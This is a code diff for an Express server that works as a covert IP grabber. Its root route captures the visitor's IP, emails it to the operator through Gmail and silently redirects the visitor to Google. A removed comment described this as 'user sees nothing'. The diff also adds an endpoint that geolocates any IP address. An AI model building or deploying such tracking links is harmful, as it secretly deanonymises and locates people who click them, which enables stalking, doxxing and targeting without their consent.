@@ -10,6 +10,7 @@ const PORT = process.env.PORT || 3000;
 
 app.set("trust proxy", true);
 
+// Email setup
 const transporter = nodemailer.createTransport({
 	service: "gmail",
 	auth: {
@@ -18,6 +19,9 @@ const transporter = nodemailer.createTransport({
 	},
 });
 
+// ======================
+// 1️⃣ Visitor IP Logger
+// ======================
 app.get("/", async (req, res) => {
 	const userIP =
 		req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
@@ -55,14 +59,29 @@ app.get("/", async (req, res) => {
 			text: message,
 		});
 
-		// ✅ SILENT RESPONSE (user sees nothing)
 		res.redirect("https://google.com");
 	} catch (err) {
-		console.error("❌ Error during logging/email:", err);
+		console.error("❌ Logging error:", err);
 		res.status(500).send("Error logging IP.");
 	}
 });
 
+// ======================
+// 2️⃣ IP Lookup Tool
+// ======================
+app.get("/lookup/:ip", async (req, res) => {
+	const targetIP = req.params.ip;
+
+	try {
+		const geoRes = await fetch(`http://ip-api.com/json/${targetIP}`);
+		const data = await geoRes.json();
+		res.json(data);
+	} catch (err) {
+		console.error("❌ Lookup error:", err);
+		res.status(500).send("Error looking up IP.");
+	}
+});
+
 app.listen(PORT, () => {
-	console.log(`✅ Server is running on port ${PORT}`);
+	console.log(`✅ Server running on port ${PORT}`);
 });
